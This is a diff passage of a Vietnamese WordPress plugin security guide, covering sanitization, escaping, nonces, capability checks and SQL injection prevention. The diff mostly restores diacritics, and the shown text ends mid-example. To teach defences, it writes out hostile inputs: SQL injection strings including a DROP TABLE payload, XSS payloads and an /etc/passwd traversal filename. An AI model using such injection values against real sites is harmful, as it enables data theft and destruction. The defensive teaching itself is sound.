@@ -1,67 +1,67 @@
-# Bao mat Plugin WordPress
+# Bảo mật Plugin WordPress
 
-## Muc luc
+## Mục lục
 
-1. [Nguyen tac bao mat trong Plugin](#1-nguyen-tac-bao-mat-trong-plugin)
+1. [Nguyên tắc bảo mật trong Plugin](#1-nguyen-tac-bao-mat-trong-plugin)
 2. [Sanitize Input](#2-sanitize-input)
 3. [Escape Output](#3-escape-output)
-4. [Nonces - Chong CSRF](#4-nonces---chong-csrf)
+4. [Nonces - Chống CSRF](#4-nonces---chong-csrf)
 5. [Capability Checks](#5-capability-checks)
 6. [SQL Injection Prevention](#6-sql-injection-prevention)
 7. [XSS Prevention](#7-xss-prevention)
 8. [CSRF Prevention](#8-csrf-prevention)
 9. [File Upload Security](#9-file-upload-security)
 10. [Data Validation](#10-data-validation)
-11. [Code vi du cho tung loai bao mat](#11-code-vi-du-cho-tung-loai-bao-mat)
+11. [Code ví dụ cho từng loại bảo mật](#11-code-vi-du-cho-tung-loai-bao-mat)
 12. [Best Practices](#12-best-practices)
 
 ---
 
-## 1. Nguyen tac bao mat trong Plugin
+## 1. Nguyên tắc bảo mật trong Plugin
 
-### 3 Nguyen tac vang
+### 3 Nguyên tắc vàng
 
 ```
-1. KHONG BAO GIO tin tuong du lieu tu nguoi dung
-   - Tat ca input la nguy hiem cho den khi duoc lam sach
+1. KHÔNG BAO GIỜ tin tưởng dữ liệu từ người dùng
+   - Tất cả input là nguy hiểm cho đến khi được làm sạch
    - $_GET, $_POST, $_REQUEST, $_COOKIE, $_SERVER, $_FILES
    - Form data, AJAX data, URL parameters, HTTP headers
 
-2. LUON LUON:
-   - Sanitize INPUT (khi nhan du lieu)
-   - Validate DATA (kiem tra hop le)
-   - Escape OUTPUT (khi hien thi)
+2. LUÔN LUÔN:
+   - Sanitize INPUT (khi nhận dữ liệu)
+   - Validate DATA (kiểm tra hợp lệ)
+   - Escape OUTPUT (khi hiển thị)
 
-3. NGUYEN TAC TOI THIEU QUYEN (Least Privilege):
-   - Chi cap quyen toi thieu can thiet
-   - Kiem tra quyen truoc MOI hanh dong
+3. NGUYÊN TẮC TỐI THIỂU QUYỀN (Least Privilege):
+   - Chỉ cấp quyền tối thiểu cần thiết
+   - Kiểm tra quyền trước MỌI hành động
 ```
 
-### Luong xu ly du lieu an toan
+### Luồng xử lý dữ liệu an toàn
 
 ```
-Nguoi dung nhap       Sanitize       Validate       Luu DB
-[Form Input] -----> [Lam sach] ----> [Kiem tra] ----> [Database]
+Người dùng nhập      Sanitize       Validate       Lưu DB
+[Form Input] -----> [Làm sạch] ----> [Kiểm tra] ----> [Database]
                     remove tags      is_email?        prepare()
                     trim spaces      length OK?
                     escape chars     range OK?
 
-Doc tu DB            Escape           Hien thi
-[Database] -------> [Ma hoa] ------> [Browser]
-                    esc_html()        An toan
-                    esc_attr()        Khong bi XSS
+Đọc từ DB           Escape           Hiển thị
+[Database] -------> [Mã hóa] ------> [Browser]
+                    esc_html()        An toàn
+                    esc_attr()        Không bị XSS
                     esc_url()
 ```
 
-### So sanh voi Laravel
+### So sánh với Laravel
 
 ```
 Laravel                          WordPress
-Form Request + Validation  =>    Sanitize + Validate thu cong
-CSRF Token (tu dong)       =>    Nonces (thu cong)
+Form Request + Validation  =>    Sanitize + Validate thủ công
+CSRF Token (tự động)       =>    Nonces (thủ công)
 Middleware (auth, etc.)    =>    current_user_can()
-Eloquent (tu escape)       =>    $wpdb->prepare()
-Blade {{ }} (tu escape)    =>    esc_html(), esc_attr()
+Eloquent (tự escape)       =>    $wpdb->prepare()
+Blade {{ }} (tự escape)    =>    esc_html(), esc_attr()
 {!! !!} (raw output)       =>    wp_kses_post()
 ```
 
@@ -69,82 +69,82 @@ Blade {{ }} (tu escape)    =>    esc_html(), esc_attr()
 
 ## 2. Sanitize Input
 
-### Toan bo ham Sanitize cua WordPress
+### Toàn bộ hàm Sanitize của WordPress
 
 ```php
 <?php
 /**
- * SANITIZE = Lam sach du lieu dau vao.
- * Ap dung NGAY KHI NHAN du lieu tu nguoi dung.
- * Loai bo cac ky tu nguy hiem, dinh dang lai du lieu.
+ * SANITIZE = Làm sạch dữ liệu đầu vào.
+ * Áp dụng NGAY KHI NHẬN dữ liệu từ người dùng.
+ * Loại bỏ các ký tự nguy hiểm, định dạng lại dữ liệu.
  */
 
 // === TEXT ===
 
-// sanitize_text_field() - Lam sach text 1 dong
-// Xoa: HTML tags, xuong dong, tab, khoang trang thua
+// sanitize_text_field() - Làm sạch text 1 dòng
+// Xóa: HTML tags, xuống dòng, tab, khoảng trắng thừa
 $name = sanitize_text_field( $_POST['name'] );
 // Input:  " <script>alert(1)</script>Nguyen Van A  "
 // Output: "Nguyen Van A"
 
-// sanitize_textarea_field() - Lam sach text nhieu dong
-// Giong sanitize_text_field NHUNG giu lai xuong dong (\n)
+// sanitize_textarea_field() - Làm sạch text nhiều dòng
+// Giống sanitize_text_field NHƯNG giữ lại xuống dòng (\n)
 $bio = sanitize_textarea_field( $_POST['bio'] );
 // Input:  "<b>Dong 1</b>\nDong 2<script>alert(1)</script>"
 // Output: "Dong 1\nDong 2"
 
-// sanitize_title() - Tao slug
+// sanitize_title() - Tạo slug
 $slug = sanitize_title( 'Bai Viet Cua Toi!' );
 // Output: "bai-viet-cua-toi"
 
-// sanitize_key() - Tao key an toan (chi a-z, 0-9, -, _)
+// sanitize_key() - Tạo key an toàn (chỉ a-z, 0-9, -, _)
 $key = sanitize_key( 'My Option Key!' );
 // Output: "my_option_key"
 
-// sanitize_html_class() - Lam sach CSS class name
+// sanitize_html_class() - Làm sạch CSS class name
 $class = sanitize_html_class( 'my-class <script>' );
 // Output: "my-classscript"
 
 // === EMAIL ===
 
-// sanitize_email() - Chi giu lai ky tu hop le cho email
+// sanitize_email() - Chỉ giữ lại ký tự hợp lệ cho email
 $email = sanitize_email( 'user<script>@example.com' );
 // Output: "user@example.com"
 
 // === URL ===
 
-// sanitize_url() (WP 5.9+) hoac esc_url_raw()
-// Lam sach URL de luu vao database
+// sanitize_url() (WP 5.9+) hoặc esc_url_raw()
+// Làm sạch URL để lưu vào database
 $url = sanitize_url( 'https://example.com/page?foo=bar&baz=<script>' );
 
-// esc_url_raw() - Lam sach URL cho database (khong encode &)
+// esc_url_raw() - Làm sạch URL cho database (không encode &)
 $url_db = esc_url_raw( $_POST['website'] );
 
-// === SO ===
+// === SỐ ===
 
-// absint() - So nguyen duong tuyet doi
+// absint() - Số nguyên dương tuyệt đối
 $count = absint( $_POST['count'] );     // "-5" => 5, "abc" => 0
-// intval() - So nguyen (co the am)
+// intval() - Số nguyên (có thể âm)
 $offset = intval( $_POST['offset'] );   // "-5" => -5
-// floatval() - So thuc
+// floatval() - Số thực
 $price = floatval( $_POST['price'] );   // "19.99abc" => 19.99
 
 // === FILE ===
 
-// sanitize_file_name() - Lam sach ten file
+// sanitize_file_name() - Làm sạch tên file
 $filename = sanitize_file_name( '../../../etc/passwd' );
-// Output: "etc-passwd" (xoa ky tu traversal)
+// Output: "etc-passwd" (xóa ký tự traversal)
 
-// sanitize_mime_type() - Lam sach MIME type
+// sanitize_mime_type() - Làm sạch MIME type
 $mime = sanitize_mime_type( $_FILES['file']['type'] );
 
 // === HTML ===
 
-// wp_strip_all_tags() - Xoa TAT CA tags HTML
+// wp_strip_all_tags() - Xóa TẤT CẢ tags HTML
 $text = wp_strip_all_tags( '<p>Hello <strong>World</strong></p>' );
 // Output: "Hello World"
 
-// wp_kses() - Chi cho phep cac tags HTML cu the
+// wp_kses() - Chỉ cho phép các tags HTML cụ thể
 $allowed = array(
     'a'      => array( 'href' => array(), 'title' => array() ),
     'strong' => array(),
@@ -152,22 +152,22 @@ $allowed = array(
     'br'     => array(),
 );
 $safe_html = wp_kses( $_POST['content'], $allowed );
-// Xoa tat ca tags khong co trong $allowed
+// Xóa tất cả tags không có trong $allowed
 
-// wp_kses_post() - Cho phep HTML an toan nhu bai viet
-// Bao gom: p, a, img, h1-h6, ul, ol, li, strong, em, blockquote, v.v.
+// wp_kses_post() - Cho phép HTML an toàn như bài viết
+// Bao gồm: p, a, img, h1-h6, ul, ol, li, strong, em, blockquote, v.v.
 $content = wp_kses_post( $_POST['content'] );
 
-// wp_kses_data() - Chi cho phep HTML trong attribute
-// Rat han che
+// wp_kses_data() - Chỉ cho phép HTML trong attribute
+// Rất hạn chế
 
-// === MAU SAC ===
+// === MÀU SẮC ===
 
-// sanitize_hex_color() - Kiem tra va tra ve ma mau hex
+// sanitize_hex_color() - Kiểm tra và trả về mã màu hex
 $color = sanitize_hex_color( $_POST['color'] );
 // "#ff0000" => "#ff0000", "not-a-color" => null
 
-// sanitize_hex_color_no_hash() - Khong co dau #
+// sanitize_hex_color_no_hash() - Không có dấu #
 $color_no_hash = sanitize_hex_color_no_hash( $_POST['color'] );
 ```
 
@@ -175,79 +175,79 @@ $color_no_hash = sanitize_hex_color_no_hash( $_POST['color'] );
 
 ## 3. Escape Output
 
-### Toan bo ham Escape cua WordPress
+### Toàn bộ hàm Escape của WordPress
 
 ```php
 <?php
 /**
- * ESCAPE = Ma hoa du lieu khi HIEN THI.
- * Ngan browser thuc thi code doc hai.
- * Ap dung NGAY TRUOC KHI echo/output.
+ * ESCAPE = Mã hóa dữ liệu khi HIỂN THỊ.
+ * Ngăn browser thực thi code độc hại.
+ * Áp dụng NGAY TRƯỚC KHI echo/output.
  *
- * NGUYEN TAC: "Escape late" - Escape cang muon cang tot (ngay truoc output)
+ * NGUYÊN TẮC: "Escape late" - Escape càng muộn càng tốt (ngay trước output)
  */
 
-// === esc_html() - Escape cho noi dung HTML ===
-// Chuyen doi: < > & " ' thanh HTML entities
-// Dung trong: text node, noi dung the HTML
+// === esc_html() - Escape cho nội dung HTML ===
+// Chuyển đổi: < > & " ' thành HTML entities
+// Dùng trong: text node, nội dung thẻ HTML
 
 $user_name = '<script>alert("XSS")</script>';
 
-// SAI - Bi XSS!
+// SAI - Bị XSS!
 echo $user_name;
-// Output: <script>alert("XSS")</script> => Browser thuc thi script!
+// Output: <script>alert("XSS")</script> => Browser thực thi script!
 
 // DUNG
 echo esc_html( $user_name );
 // Output: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
-// Browser hien thi text, KHONG thuc thi script
+// Browser hiển thị text, KHÔNG thực thi script
 
-// Vi du thuc te
-echo '<p>Xin chao, ' . esc_html( $user_name ) . '</p>';
+// Ví dụ thực tế
+echo '<p>Xin chào, ' . esc_html( $user_name ) . '</p>';
 echo '<h1>' . esc_html( get_the_title() ) . '</h1>';
 
 // === esc_attr() - Escape cho HTML attributes ===
-// Dung trong: value, title, alt, class, id, data-*
+// Dùng trong: value, title, alt, class, id, data-*
 
 $value = '" onmouseover="alert(1)" data-x="';
 
 // SAI
 echo '<input value="' . $value . '">';
 // Output: <input value="" onmouseover="alert(1)" data-x="">
-// => Them event handler doc hai!
+// => Thêm event handler độc hại!
 
 // DUNG
 echo '<input value="' . esc_attr( $value ) . '">';
 // Output: <input value="&quot; onmouseover=&quot;alert(1)&quot; data-x=&quot;">
-// => An toan, hien thi nhu text
+// => An toàn, hiển thị như text
 
-// Vi du thuc te
+// Ví dụ thực tế
 echo '<input type="text" name="email" value="' . esc_attr( $email ) . '">';
 echo '<div class="' . esc_attr( $css_class ) . '">';
 echo '<a title="' . esc_attr( $tooltip ) . '">';
 echo '<div data-id="' . esc_attr( $item_id ) . '">';
 
 // === esc_url() - Escape cho URLs ===
-// Kiem tra protocol (chi cho phep http, https, ftp, mailto, tel, v.v.)
-// Loai bo javascript:, data:, v.v.
+// Kiểm tra protocol (chỉ cho phép http, https, ftp, mailto, tel, v.v.)
+// Loại bỏ javascript:, data:, v.v.
 
 $url = 'javascript:alert("XSS")';
 
 // SAI
 echo '<a href="' . $url . '">Click</a>';
-// => Click se thuc thi JavaScript!
+// => Click sẽ thực thi JavaScript!
 
 // DUNG
 echo '<a href="' . esc_url( $url ) . '">Click</a>';
 // Output: <a href="">Click</a>
-// => URL bi xoa vi protocol nguy hiem
+// => URL bị xóa vì protocol nguy hiểm
 
-// Vi du thuc te
-echo '<a href="' . esc_url( $link ) . '">Truy cap</a>';
+// Ví dụ thực tế
+echo '<a href="' . esc_url( $link ) . '">Truy cập</a>';
 echo '<img src="' . esc_url( $image_url ) . '">';
 echo '<form action="' . esc_url( admin_url( 'admin-post.php' ) ) . '">';
 
-// Cho phep protocols tuy chinh
+// Cho phép protocols tùy chỉnh
 echo esc_url( $url, array( 'http', 'https', 'tel', 'skype' ) );
 
 // === esc_js() - Escape cho inline JavaScript ===
@@ -256,21 +256,21 @@ $message = "Hello 'World' \"Test\"";
 echo '<script>alert("' . esc_js( $message ) . '")</script>';
 // Output: <script>alert("Hello \'World\' \"Test\"")</script>
 
-// Vi du thuc te
+// Ví dụ thực tế
 echo '<button onclick="alert(\'' . esc_js( $message ) . '\')">';
 
-// === esc_textarea() - Escape cho noi dung textarea ===
+// === esc_textarea() - Escape cho nội dung textarea ===
 $text = '<script>alert(1)</script>Hello';
 
 echo '<textarea>' . esc_textarea( $text ) . '</textarea>';
-// Noi dung hien thi an toan trong textarea
+// Nội dung hiển thị an toàn trong textarea
 
-// === wp_kses_post() - Escape HTML nhu bai viet ===
-// Cho phep HTML an toan, xoa nguy hiem
+// === wp_kses_post() - Escape HTML như bài viết ===
+// Cho phép HTML an toàn, xóa nguy hiểm
 $content = wp_kses_post( $raw_html );
-echo $content; // An toan vi da duoc loc
+echo $content; // An toàn vì đã được lọc
 
-// === wp_kses() - Escape HTML tuy chinh ===
+// === wp_kses() - Escape HTML tùy chỉnh ===
 $allowed_tags = array(
     'a'      => array( 'href' => true, 'title' => true, 'target' => true ),
     'strong' => array(),
@@ -280,56 +280,56 @@ $allowed_tags = array(
 echo wp_kses( $html_content, $allowed_tags );
 ```
 
-### Bang tom tat: Khi nao dung ham nao?
+### Bảng tóm tắt: Khi nào dùng hàm nào?
 
 ```
 +------------------+-----------------------------+------------------------+
-| Ngu canh         | Ham escape                  | Vi du                  |
+| Ngữ cảnh        | Hàm escape                  | Ví dụ                  |
 +------------------+-----------------------------+------------------------+
 | Text trong HTML  | esc_html()                  | <p>TEXT</p>            |
 | HTML attribute   | esc_attr()                  | <input value="ATTR">   |
 | URL (href, src)  | esc_url()                   | <a href="URL">         |
 | Inline JS        | esc_js()                    | onclick="FN('JS')"     |
 | Textarea value   | esc_textarea()              | <textarea>TEXT</textarea>|
-| Safe HTML        | wp_kses_post()              | Noi dung bai viet      |
-| Custom HTML      | wp_kses($html, $allowed)    | HTML tuy chinh         |
-| URL cho DB       | esc_url_raw()               | Luu URL vao database   |
+| Safe HTML        | wp_kses_post()              | Nội dung bài viết      |
+| Custom HTML      | wp_kses($html, $allowed)    | HTML tùy chỉnh         |
+| URL cho DB       | esc_url_raw()               | Lưu URL vào database   |
 +------------------+-----------------------------+------------------------+
 ```
 
 ---
 
-## 4. Nonces - Chong CSRF
+## 4. Nonces - Chống CSRF
 
 ```php
 <?php
 /**
- * NONCE = "Number used Once" (thuc te la hash string, khong phai so)
- * Bao ve khoi CSRF (Cross-Site Request Forgery).
+ * NONCE = "Number used Once" (thực tế là hash string, không phải số)
+ * Bảo vệ khỏi CSRF (Cross-Site Request Forgery).
  *
- * CSRF la gi?
- * Ke tan cong dua nan nhan click link/form gui request den site cua ban
- * Nonce chung minh request den tu trang cua ban, khong phai tu site khac
+ * CSRF là gì?
+ * Kẻ tấn công đưa nạn nhân click link/form gửi request đến site của bạn
+ * Nonce chứng minh request đến từ trang của bạn, không phải từ site khác
  *
- * So sanh voi Laravel:
- * Laravel: @csrf trong Blade => tu dong sinh _token
- * WordPress: wp_nonce_field() => thu cong them vao form
+ * So sánh với Laravel:
+ * Laravel: @csrf trong Blade => tự động sinh _token
+ * WordPress: wp_nonce_field() => thủ công thêm vào form
  */
 
 // === TRONG FORM ===
 
-// TAO nonce cho form
+// TẠO nonce cho form
 function render_my_form() {
     ?>
     <form method="post" action="">
         <?php
         /**
-         * wp_nonce_field() - Tao hidden input chua nonce
+         * wp_nonce_field() - Tạo hidden input chứa nonce
          *
-         * @param string $action   Hanh dong (bat ky chuoi nao)
-         * @param string $name     Ten truong hidden (mac dinh: _wpnonce)
-         * @param bool   $referer  Them referrer field (mac dinh: true)
-         * @param bool   $echo     Echo hay return (mac dinh: true)
+         * @param string $action   Hành động (bất kỳ chuỗi nào)
+         * @param string $name     Tên trường hidden (mặc định: _wpnonce)
+         * @param bool   $referer  Thêm referrer field (mặc định: true)
+         * @param bool   $echo     Echo hay return (mặc định: true)
          */
         wp_nonce_field( 'my_form_save', 'my_form_nonce' );
         // Output: <input type="hidden" name="my_form_nonce" value="a1b2c3d4e5">
@@ -337,83 +337,83 @@ function render_my_form() {
         ?>
 
         <input type="text" name="title" value="">
-        <button type="submit">Luu</button>
+        <button type="submit">Lưu</button>
     </form>
     <?php
 }
 
-// KIEM TRA nonce khi xu ly form
+// KIỂM TRA nonce khi xử lý form
 function handle_my_form() {
     if ( ! isset( $_POST['my_form_nonce'] ) ) {
         return;
     }
 
     /**
-     * wp_verify_nonce() - Kiem tra nonce co hop le khong
+     * wp_verify_nonce() - Kiểm tra nonce có hợp lệ không
      *
-     * @param string $nonce  Gia tri nonce tu form
-     * @param string $action Hanh dong (phai khop voi wp_nonce_field)
+     * @param string $nonce  Giá trị nonce từ form
+     * @param string $action Hành động (phải khớp với wp_nonce_field)
      *
      * @return int|false
-     *   1 = nonce duoi 12 gio (moi)
-     *   2 = nonce 12-24 gio (cu nhung con hop le)
-     *   false = khong hop le
+     *   1 = nonce dưới 12 giờ (mới)
+     *   2 = nonce 12-24 giờ (cũ nhưng còn hợp lệ)
+     *   false = không hợp lệ
      */
     if ( ! wp_verify_nonce( $_POST['my_form_nonce'], 'my_form_save' ) ) {
-        wp_die( 'Xac thuc bao mat that bai!' );
+        wp_die( 'Xác thực bảo mật thất bại!' );
     }
 
-    // Nonce hop le, xu ly tiep...
+    // Nonce hợp lệ, xử lý tiếp...
     $title = sanitize_text_field( $_POST['title'] );
 }
 
-// CACH NGAN GON: check_admin_referer()
+// CÁCH NGẮN GỌN: check_admin_referer()
 function handle_my_form_short() {
     /**
-     * check_admin_referer() - Kiem tra nonce + referer
-     * Tu dong die() neu that bai
+     * check_admin_referer() - Kiểm tra nonce + referer
+     * Tự động die() nếu thất bại
      *
-     * @param string $action    Hanh dong
-     * @param string $query_arg Ten truong (mac dinh: _wpnonce)
+     * @param string $action    Hành động
+     * @param string $query_arg Tên trường (mặc định: _wpnonce)
      */
     check_admin_referer( 'my_form_save', 'my_form_nonce' );
-    // Neu nonce sai => Tu dong hien trang loi 403 va die()
+    // Nếu nonce sai => Tự động hiện trang lỗi 403 và die()
 
-    // Code xu ly chi chay khi nonce dung
+    // Code xử lý chỉ chạy khi nonce đúng
 }
 
 // === TRONG URL ===
 
-// TAO URL co nonce
+// TẠO URL có nonce
 $delete_url = wp_nonce_url(
     admin_url( 'admin.php?page=my-plugin&action=delete&id=5' ),
-    'delete_item_5'         // Action (nen bao gom ID de duy nhat)
+    'delete_item_5'         // Action (nên bao gồm ID để duy nhất)
 );
 // URL: admin.php?page=my-plugin&action=delete&id=5&_wpnonce=a1b2c3
 
-echo '<a href="' . esc_url( $delete_url ) . '">Xoa</a>';
+echo '<a href="' . esc_url( $delete_url ) . '">Xóa</a>';
 
-// KIEM TRA nonce tu URL
+// KIỂM TRA nonce từ URL
 if ( isset( $_GET['action'] ) && $_GET['action'] === 'delete' ) {
     $id = absint( $_GET['id'] );
     check_admin_referer( 'delete_item_' . $id );
-    // Xu ly xoa...
+    // Xử lý xóa...
 }
 
 // === TRONG AJAX ===
 
-// PHP: Tao nonce va gui sang JS
+// PHP: Tạo nonce và gửi sang JS
 wp_localize_script( 'my-script', 'myData', array(
     'nonce' => wp_create_nonce( 'my_ajax_action' ),
 ));
 
-// JS: Gui nonce kem AJAX
+// JS: Gửi nonce kèm AJAX
 // $.post(ajaxUrl, { action: 'my_action', nonce: myData.nonce, ... });
 
-// PHP: Kiem tra nonce tu AJAX
+// PHP: Kiểm tra nonce từ AJAX
 add_action( 'wp_ajax_my_action', function() {
     check_ajax_referer( 'my_ajax_action', 'nonce' );
-    // Xu ly...
+    // Xử lý...
     wp_send_json_success();
 });
 ```
@@ -425,12 +425,12 @@ add_action( 'wp_ajax_my_action', function() {
 ```php
 <?php
 /**
- * CAPABILITY CHECK = Kiem tra quyen cua nguoi dung
- * Dam bao nguoi dung co quyen thuc hien hanh dong.
+ * CAPABILITY CHECK = Kiểm tra quyền của người dùng
+ * Đảm bảo người dùng có quyền thực hiện hành động.
  *
- * Phai kiem tra quyen TRUOC moi hanh dong quan trong.
+ * Phải kiểm tra quyền TRƯỚC mọi hành động quan trọng.
  *
- * So sanh voi Laravel:
+ * So sánh với Laravel:
  * Laravel: Gate::allows(), @can, Policy
  * WordPress: current_user_can()
  */
@@ -438,63 +438,63 @@ add_action( 'wp_ajax_my_action', function() {
 // === current_user_can() ===
 
 /**
- * current_user_can() - Kiem tra nguoi dung hien tai co quyen khong
+ * current_user_can() - Kiểm tra người dùng hiện tại có quyền không
  *
- * @param string $capability  Ten quyen
- * @param mixed  ...$args     Tham so them (vi du: post_id)
+ * @param string $capability  Tên quyền
+ * @param mixed  ...$args     Tham số thêm (ví dụ: post_id)
  * @return bool
  */
 
-// Kiem tra truoc khi lam bat ky gi
+// Kiểm tra trước khi làm bất kỳ gì
 function my_admin_action() {
-    // Quyen quan tri toan bo
+    // Quyền quản trị toàn bộ
     if ( ! current_user_can( 'manage_options' ) ) {
-        wp_die( 'Ban khong co quyen thuc hien hanh dong nay.' );
+        wp_die( 'Bạn không có quyền thực hiện hành động này.' );
     }
-    // Xu ly...
+    // Xử lý...
 }
 
-// === CÁC QUYEN THUONG DUNG ===
+// === CÁC QUYỀN THƯỜNG DÙNG ===
 
-// --- Quyen lien quan Posts ---
-current_user_can( 'edit_posts' );          // Sua bai viet cua minh
-current_user_can( 'edit_others_posts' );   // Sua bai cua nguoi khac
-current_user_can( 'publish_posts' );       // Xuat ban bai viet
-current_user_can( 'delete_posts' );        // Xoa bai viet
-current_user_can( 'edit_post', $post_id ); // Sua 1 bai cu the
+// --- Quyền liên quan Posts ---
+current_user_can( 'edit_posts' );          // Sửa bài viết của mình
+current_user_can( 'edit_others_posts' );   // Sửa bài của người khác
+current_user_can( 'publish_posts' );       // Xuất bản bài viết
+current_user_can( 'delete_posts' );        // Xóa bài viết
+current_user_can( 'edit_post', $post_id ); // Sửa 1 bài cụ thể
 
-// --- Quyen lien quan Pages ---
+// --- Quyền liên quan Pages ---
 current_user_can( 'edit_pages' );
 current_user_can( 'publish_pages' );
 
-// --- Quyen quan tri ---
-current_user_can( 'manage_options' );      // Quan ly cai dat (Admin)
-current_user_can( 'activate_plugins' );    // Kich hoat plugin
-current_user_can( 'edit_theme_options' );  // Tuy chinh theme
-current_user_can( 'manage_categories' );   // Quan ly danh muc
-current_user_can( 'moderate_comments' );   // Quan ly binh luan
+// --- Quyền quản trị ---
+current_user_can( 'manage_options' );      // Quản lý cài đặt (Admin)
+current_user_can( 'activate_plugins' );    // Kích hoạt plugin
+current_user_can( 'edit_theme_options' );  // Tùy chỉnh theme
+current_user_can( 'manage_categories' );   // Quản lý danh mục
+current_user_can( 'moderate_comments' );   // Quản lý bình luận
 current_user_can( 'upload_files' );        // Upload file
-current_user_can( 'install_plugins' );     // Cai plugin moi
-current_user_can( 'create_users' );        // Tao user moi
+current_user_can( 'install_plugins' );     // Cài plugin mới
+current_user_can( 'create_users' );        // Tạo user mới
 
-// --- Quyen nguoi dung ---
-current_user_can( 'read' );                // Doc noi dung (tat ca user)
-current_user_can( 'edit_user', $user_id ); // Sua user cu the
+// --- Quyền người dùng ---
+current_user_can( 'read' );                // Đọc nội dung (tất cả user)
+current_user_can( 'edit_user', $user_id ); // Sửa user cụ thể
 
-// === ROLES VA CAPABILITIES ===
+// === ROLES VÀ CAPABILITIES ===
 
-// Roles mac dinh va quyen cua chung:
-// Administrator: Toan quyen
+// Roles mặc định và quyền của chúng:
+// Administrator: Toàn quyền
 // Editor:        edit_others_posts, publish_posts, manage_categories, moderate_comments
-// Author:        edit_posts (cua minh), publish_posts, upload_files
-// Contributor:   edit_posts (cua minh), KHONG publish
+// Author:        edit_posts (của mình), publish_posts, upload_files
+// Contributor:   edit_posts (của mình), KHÔNG publish
 // Subscriber:    read
 
-// === TAO CUSTOM CAPABILITY ===
+// === TẠO CUSTOM CAPABILITY ===
 
-// Them custom capability khi activate
+// Thêm custom capability khi activate
 register_activation_hook( __FILE__, function() {
-    // Them quyen moi cho admin
+    // Thêm quyền mới cho admin
     $admin = get_role( 'administrator' );
     if ( $admin ) {
         $admin->add_cap( 'manage_my_plugin' );
@@ -502,35 +502,35 @@ register_activation_hook( __FILE__, function() {
         $admin->add_cap( 'delete_my_plugin_items' );
     }
 
-    // Them quyen cho editor
+    // Thêm quyền cho editor
     $editor = get_role( 'editor' );
     if ( $editor ) {
         $editor->add_cap( 'edit_my_plugin_items' );
     }
 });
 
-// Xoa custom capability khi uninstall
+// Xóa custom capability khi uninstall
 // Trong uninstall.php:
 // $admin = get_role( 'administrator' );
 // $admin->remove_cap( 'manage_my_plugin' );
 
-// Su dung custom capability
+// Sử dụng custom capability
 if ( current_user_can( 'manage_my_plugin' ) ) {
-    // Admin co the truy cap
+    // Admin có thể truy cập
 }
 
 if ( current_user_can( 'edit_my_plugin_items' ) ) {
-    // Admin va Editor co the truy cap
+    // Admin và Editor có thể truy cập
 }
 
-// === VI DU THUC TE ===
+// === VÍ DỤ THỰC TẾ ===
 
-// Trong menu: an menu neu khong co quyen
+// Trong menu: ẩn menu nếu không có quyền
 add_action( 'admin_menu', function() {
     add_menu_page(
         'My Plugin',
         'My Plugin',
-        'manage_my_plugin',     // <-- CHI USER CO QUYEN NAY MOI THAY MENU
+        'manage_my_plugin',     // <-- CHỈ USER CÓ QUYỀN NÀY MỚI THẤY MENU
         'my-plugin',
         'my_plugin_page'
     );
@@ -540,12 +540,12 @@ add_action( 'admin_menu', function() {
 add_action( 'wp_ajax_delete_item', function() {
     check_ajax_referer( 'my_nonce', 'nonce' );
 
-    // Kiem tra quyen cụ the
+    // Kiểm tra quyền cụ thể
     if ( ! current_user_can( 'delete_my_plugin_items' ) ) {
-        wp_send_json_error( array( 'message' => 'Khong co quyen xoa.' ), 403 );
+        wp_send_json_error( array( 'message' => 'Không có quyền xóa.' ), 403 );
     }
 
-    // Xu ly xoa...
+    // Xử lý xóa...
     wp_send_json_success();
 });
 
@@ -566,65 +566,65 @@ register_rest_route( 'my/v1', '/items', array(
 ```php
 <?php
 /**
- * SQL INJECTION la gi?
- * Ke tan cong chen code SQL vao input de doc/sua/xoa database.
+ * SQL INJECTION là gì?
+ * Kẻ tấn công chèn code SQL vào input để đọc/sửa/xóa database.
  *
- * Vi du:
+ * Ví dụ:
  * Input: ' OR 1=1 --
  * Query: SELECT * FROM users WHERE email = '' OR 1=1 --'
- * Ket qua: Lay TOAN BO users!
+ * Kết quả: Lấy TOÀN BỘ users!
  */
 
 global $wpdb;
 $table = $wpdb->prefix . 'my_items';
 
 // ============================================
-// SAI - DEO BI SQL INJECTION!
+// SAI - DỄ BỊ SQL INJECTION!
 // ============================================
 
-// Truong hop 1: Noi truc tiep bien vao query
-$id = $_GET['id']; // Gia su: "1 OR 1=1"
+// Trường hợp 1: Nối trực tiếp biến vào query
+$id = $_GET['id']; // Giả sử: "1 OR 1=1"
 $result = $wpdb->get_row( "SELECT * FROM {$table} WHERE id = {$id}" );
 // Query: SELECT * FROM wp_my_items WHERE id = 1 OR 1=1
-// => Lay tat ca rows!
+// => Lấy tất cả rows!
 
-// Truong hop 2: Noi chuoi
-$email = $_POST['email']; // Gia su: "'; DROP TABLE wp_users; --"
+// Trường hợp 2: Nối chuỗi
+$email = $_POST['email']; // Giả sử: "'; DROP TABLE wp_users; --"
 $wpdb->query( "DELETE FROM {$table} WHERE email = '{$email}'" );
 // Query: DELETE FROM wp_my_items WHERE email = ''; DROP TABLE wp_users; --'
-// => XOA BANG USERS!
+// => XÓA BẢNG USERS!
 
-// Truong hop 3: LIKE injection
-$search = $_GET['s']; // Gia su: "%"
+// Trường hợp 3: LIKE injection
+$search = $_GET['s']; // Giả sử: "%"
 $wpdb->get_results( "SELECT * FROM {$table} WHERE name LIKE '%{$search}%'" );
-// => Lay tat ca du lieu!
+// => Lấy tất cả dữ liệu!
 
 // ============================================
-// DUNG - AN TOAN!
+// ĐÚNG - AN TOÀN!
 // ============================================
 
-// Cach 1: $wpdb->prepare() (BAT BUOC cho moi query co bien)
+// Cách 1: $wpdb->prepare() (BẮT BUỘC cho mọi query có biến)
 $id = absint( $_GET['id'] );
 $result = $wpdb->get_row(
     $wpdb->prepare( "SELECT * FROM {$table} WHERE id = %d", $id )
 );
-// %d tu dong chuyen sang integer, khong the inject
+// %d tự động chuyển sang integer, không thể inject
 
 $email = sanitize_email( $_POST['email'] );
 $wpdb->query(
     $wpdb->prepare( "DELETE FROM {$table} WHERE email = %s", $email )
 );
-// %s tu dong escape quotes
+// %s tự động escape quotes
 
-// Cach 2: LIKE voi esc_like()
+// Cách 2: LIKE với esc_like()
 $search = sanitize_text_field( $_GET['s'] );
 $like = '%' . $wpdb->esc_like( $search ) . '%';
 $results = $wpdb->get_results(
     $wpdb->prepare( "SELECT * FROM {$table} WHERE name LIKE %s", $like )
 );
-// esc_like() escape: %, _, \ trong gia tri LIKE
+// esc_like() escape: %, _, \ trong giá trị LIKE
 
-// Cach 3: IN clause an toan
+// Cách 3: IN clause an toàn
 $ids = array_map( 'absint', (array) $_POST['ids'] );
